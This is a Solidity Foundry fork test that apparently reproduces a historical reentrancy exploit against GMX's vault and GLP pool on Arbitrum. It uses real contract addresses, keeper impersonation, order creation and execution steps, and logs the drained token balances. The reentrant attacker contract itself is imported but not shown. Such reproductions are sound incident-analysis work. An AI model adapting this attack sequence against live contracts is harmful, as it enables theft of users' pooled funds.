// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Test, console} from "forge-std/Test.sol";
import "../src/GMXInterface.sol";
import "../src/GMXInterfacesExtended.sol";
import "./SimpleAttacker.sol";

contract GMXForkTest is Test {
    // Fork block number from Python test
    // Block where executeIncreaseOrder was called (possibly the attack block)
    uint256 constant BLOCK_NUMBER = 355880212;
    
    // GMX contract addresses on Arbitrum (with proper EIP-55 checksums)
    address constant GMX_VAULT = 0x489ee077994B6658eAfA855C308275EAd8097C4A;
    address constant GMX_ROUTER = 0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064;
    address constant POSITION_MANAGER = 0x75E42e6f01baf1D6022bEa862A28774a9f8a4A0C;
    address constant ORDER_BOOK = 0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB;
    address constant REWARD_ROUTER = 0xB95DB5B167D75e6d04227CfFFA61069348d271F5;
    address constant GLP = 0x4277f8F2c384827B5273592FF7CeBd9f2C1ac258;
    address constant GLP_MANAGER = 0x3963FfC9dff443c2A94f21b129D429891E32ec18;
    address constant SHORT_TRACKER = 0xf58eEc83Ba28ddd79390B9e90C4d3EbfF1d434da;
    address constant VAULT_PRICE_FEED = 0x2d68011bcA022ed0E474264145F46CC4de96a002;
    address constant ORDER_KEEPER = 0xd4266F8F82F7405429EE18559e548979D49160F3;
    address constant FAST_PRICE_FEED = 0x11D62807dAE812a0F1571243460Bf94325F43BB7;
    address constant ETH_USD_PRICE_FEED = 0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612;
    address constant WBTC_USD_PRICE_FEED = 0xd0C7101eACbB49F3deCcCc166d238410D6D46d57;
    
    // Common tokens on Arbitrum (with proper EIP-55 checksums)
    address constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address constant WBTC = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;
    address constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    
    IVault vault;
    IRouter router;
    IOrderBook orderBook;
    IPositionManager positionManager;
    IGlpManager glpManager;
    IFastPriceFeed fastPriceFeed;
    IPriceFeed ethUsdPriceFeed;
    IPriceFeed wbtcUsdPriceFeed;
    IERC20 wethToken;
    IERC20 wbtcToken;
    IERC20 usdcToken;
    
    SimpleAttacker attacker;
    
    function setUp() public {
        // Fork Arbitrum mainnet at the specified block
        vm.createSelectFork("https://arb1.arbitrum.io/rpc", BLOCK_NUMBER);
        
        console.log("Forked at block:", block.number);
        console.log("Target block:", BLOCK_NUMBER);
        
        // Note: If POSITION_MANAGER is not set as handler on the fork, it could mean:
        // 1. The fork is missing state (RPC issue)
        // 2. The attack happened before this security was added
        // 3. The fork is at a block before the handler was set
        // We'll set it up in the test if needed (see testLongOrderReent)
        
        // Initialize interfaces with deployed addresses
        vault = IVault(GMX_VAULT);
        router = IRouter(GMX_ROUTER);
        orderBook = IOrderBook(ORDER_BOOK);
        positionManager = IPositionManager(POSITION_MANAGER);
        glpManager = IGlpManager(GLP_MANAGER);
        fastPriceFeed = IFastPriceFeed(FAST_PRICE_FEED);
        ethUsdPriceFeed = IPriceFeed(ETH_USD_PRICE_FEED);
        wbtcUsdPriceFeed = IPriceFeed(WBTC_USD_PRICE_FEED);
        
        wethToken = IERC20(WETH);
        wbtcToken = IERC20(WBTC);
        usdcToken = IERC20(USDC);
    }
    
    /**
     * @notice Test reentrancy attack on GMX (converted from Python test)
     * This replicates the test_long_order_reent() function from test_attack.py
     */
    function testLongOrderReent() public {
        // Deploy attacker contract
        attacker = new SimpleAttacker(
            GLP_MANAGER,
            GMX_VAULT,
            GLP,
            REWARD_ROUTER
        );
        
        // Set attacker balance
        vm.deal(address(attacker), 2 ether);
        
        uint256 wethIn = 1 ether;
        uint256 minExecFee = orderBook.minExecutionFee();
        
        // Get price from fast price feed (decimals is 30)
        uint256 price = fastPriceFeed.prices(WETH);
        
        // Calculate size delta: 1.1 times leverage
        uint256 sizeDelta = (price * wethIn / 1e18) * 110 / 100;
        
        console.log("=== Creating Increase Order ===");
        console.log("WETH in:", wethIn);
        console.log("Price:", price);
        console.log("Size delta:", sizeDelta);
        console.log("Min exec fee:", minExecFee);
        
        // Create increase order
        address[] memory path = new address[](1);
        path[0] = WETH;
        
        bytes memory createIncreaseOrderData = abi.encodeWithSelector(
            IOrderBook.createIncreaseOrder.selector,
            path,
            wethIn,
            WETH,  // indexToken
            0,     // minOut
            sizeDelta,
            WETH,  // collateralToken
            true,  // isLong
            0,     // triggerPrice
            true,  // triggerAboveThreshold
            minExecFee,
            true   // shouldWrap
        );
        
        attacker.execute{value: minExecFee + wethIn}(
            createIncreaseOrderData,
            ORDER_BOOK
        );
        
        console.log("Use 1 ether just for having a position");
        
        // Verify order keeper
        require(positionManager.isOrderKeeper(ORDER_KEEPER), "Not order keeper");
        
        // Check if POSITION_MANAGER is set as a handler in Timelock
        // Get timelock address from vault.gov()
        address timelock = vault.gov();
        ITimelock timelockContract = ITimelock(timelock);
        bool isHandler = timelockContract.isHandler(POSITION_MANAGER);
        address timelockAdmin = timelockContract.admin();
        
        console.log("=== Timelock Configuration Check ===");
        console.log("Vault address:", GMX_VAULT);
        console.log("Timelock address (from vault.gov()):", timelock);
        console.log("Timelock admin:", timelockAdmin);
        console.log("POSITION_MANAGER address:", POSITION_MANAGER);
        console.log("POSITION_MANAGER is handler (before setup):", isHandler);
        
        // If POSITION_MANAGER is not a handler, set it up (for testing on fork)
        // On the real chain, this should already be set during deployment
        if (!isHandler && timelockAdmin != address(0)) {
            console.log("Setting POSITION_MANAGER as handler in Timelock (for fork testing)...");
            vm.prank(timelockAdmin);
            timelockContract.setContractHandler(POSITION_MANAGER, true);
            
            // Verify it was set
            bool isHandlerAfter = timelockContract.isHandler(POSITION_MANAGER);
            console.log("POSITION_MANAGER is handler (after setup):", isHandlerAfter);
            require(isHandlerAfter, "Failed to set POSITION_MANAGER as handler");
        } else if (isHandler) {
            console.log("POSITION_MANAGER is already a handler - good!");
        } else {
            revert("Cannot set handler: Timelock admin is zero address");
        }
        
        // Approve plugin
        IRouterExtended routerExtended = IRouterExtended(GMX_ROUTER);
        routerExtended.approvePlugin(ORDER_BOOK);
        
        // Execute increase order
        vm.prank(ORDER_KEEPER);
        positionManager.executeIncreaseOrder(
            address(attacker),
            0,
            payable(ORDER_KEEPER)
        );
        
        // Create decrease order (full close)
        bytes memory createDecreaseOrderData = abi.encodeWithSelector(
            IOrderBook.createDecreaseOrder.selector,
            WETH,  // indexToken
            sizeDelta,
            WETH,  // collateralToken
            0,     // collateralDelta
            true,  // isLong
            0,     // triggerPrice
            true   // triggerAboveThreshold
        );
        
        attacker.execute{value: orderBook.minExecutionFee() + 1}(
            createDecreaseOrderData,
            ORDER_BOOK
        );
        
        // Mint USDC for attacker (2M USDC: 1M for position, 1M for staking)
        uint256 amountIn = 1_000_000 * 1e6;  // 1M USDC
        uint256 mintForRewardAmount = 1_000_000 * 1e6;  // 1M USDC
        
        // Deal USDC to attacker (using vm.deal equivalent for ERC20)
        deal(USDC, address(attacker), amountIn + mintForRewardAmount);
        
        console.log("Use 1M usdc for increase position");
        console.log("Use 1M usdc for staking");
        
        // Calculate collateral and size delta for reentrancy
        uint256 collateralDelta = (amountIn * 1e30) / 1e6;
        uint256 newSizeDelta = (collateralDelta * 800) / 100;  // 8 times leverage
        
        uint256 prevAum = glpManager.getAum(false);
        console.log("Previous AUM:", prevAum);
        
        attacker.set_size_delta(newSizeDelta);
        
        console.log("=== Reentrancy call ===");
        
        // Execute decrease order (this triggers reentrancy)
        vm.prank(ORDER_KEEPER);
        positionManager.executeDecreaseOrder(
            address(attacker),
            0,
            payable(ORDER_KEEPER)
        );
        
        console.log("=== After attack ===");
        
        // Check balances
        uint256 wbtcBalance = wbtcToken.balanceOf(address(attacker));
        uint256 usdcBalance = usdcToken.balanceOf(address(attacker));
        uint256 ethBalance = address(attacker).balance;
        
        console.log("WBTC balance:", wbtcBalance);
        console.log("USDC balance:", usdcBalance / 1e6);
        console.log("ETH balance:", ethBalance / 1e18);
        
        // Calculate USD values
        int256 wbtcPrice = wbtcUsdPriceFeed.latestAnswer();
        int256 ethPrice = ethUsdPriceFeed.latestAnswer();
        
        uint256 wbtcInUsd = (wbtcBalance * uint256(wbtcPrice)) / 1e16;
        uint256 usdcInUsd = usdcBalance / 1e6;
        uint256 ethInUsd = (ethBalance * uint256(ethPrice)) / 1e26;  // 8 decimals + 18 decimals
        
        console.log("WBTC in USD:", wbtcInUsd);
        console.log("USDC in USD:", usdcInUsd);
        console.log("ETH in USD:", ethInUsd);
    }
}

